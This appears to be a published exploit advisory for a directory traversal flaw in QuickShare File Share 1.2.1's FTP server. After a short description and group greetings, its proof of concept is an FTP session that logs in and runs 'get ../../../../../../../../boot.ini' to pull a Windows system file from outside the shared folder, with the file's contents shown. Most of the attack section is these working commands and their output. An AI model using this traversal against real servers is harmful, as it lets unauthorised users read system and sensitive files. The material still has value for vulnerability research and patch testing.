#!/usr/bin/python

# Exploit Title: QuickShare File Share 1.2.1 Directory Traversal Vulnerability
# Date: 02/03/2011
# Author: modpr0be
# Software Link: http://www.quicksharehq.com/files/qfssetup.exe
# Vulnerable version: 1.2.1
# Tested on: Windows XP SP3 (VMware Player 3.1.3 build-324285)
# CVE : N/A

# ======================================================================
#        ___       _ __        __            __    _     __
#   ____/ (_)___ _(_) /_____ _/ / ___  _____/ /_  (_)___/ /___  ____ _
#  / __  / / __ `/ / __/ __ `/ / / _ \/ ___/ __ \/ / __  / __ \/ __ `/
# / /_/ / / /_/ / / /_/ /_/ / / /  __/ /__/ / / / / /_/ / / / / /_/ /
# \__,_/_/\__, /_/\__/\__,_/_/  \___/\___/_/ /_/_/\__,_/_/ /_/\__,_/
#        /____/                          http://www.digital-echidna.org
# ======================================================================
#
# Greetz:
#   say hello to all digital-echidna org crew:
#     otoy, cipherstring, bean, s3o, d00m, n0rf0x, fm, gotechidna, manix
#   special thx:
#     otoy, cipherstring, cyb3r.anbu, oebaj.
#   help for documentation:   	
#     offsec, exploit-db, corelan-team, 5M7X, loneferret.
#

#### Software description:
# QuickShare File Server is a easy to use file sharing software helps you 
# build your own file server. Users could access your server through web 
# browsers or FTP client softwares (In most case, they need not to install 
# any extra softwares). Users could send or receive large files to or from you. 
# You could create account and set password to protect your files.
#
#### Exploit information:
# It&#039;s a directory traversal. User without prior permission can get a file
# outside the specified directory (e.g. get a file from %systemroot%).
#
# This vulnerability can be exploited by anonymous or authenticated users.
#
##

# Below is the proof of concept
# authenticated user logged in to the quickshare ftp server from Ubuntu Linux.
#

modpr0be@digital-echidna:~$ ftp 10.5.5.27
Connected to 10.5.5.27.
220 quickshare ftpd ready.
Name (10.5.5.27:modpr0be): ftpuser
331 User name okay, need password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; get ../../../../../../../../boot.ini boot.ini
local: boot.ini remote: ../../../../../../../../boot.ini
200 PORT command successful. Consider using PASV.
150 Opening BINARY connection.
226 File send OK.
211 bytes received in 0.00 secs (127.0 kB/s)
ftp&gt; quit
221 Goodbye.
modpr0be@digital-echidna:~$ cat boot.ini
[boot loader]
timeout=30
default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
[operating systems]
multi(0)disk(0)rdisk(0)partition(1)\WINDOWS=&quot;Microsoft Windows XP Professional&quot; /noexecute=optin /fastdetect
modpr0be@digital-echidna:~$

# Eof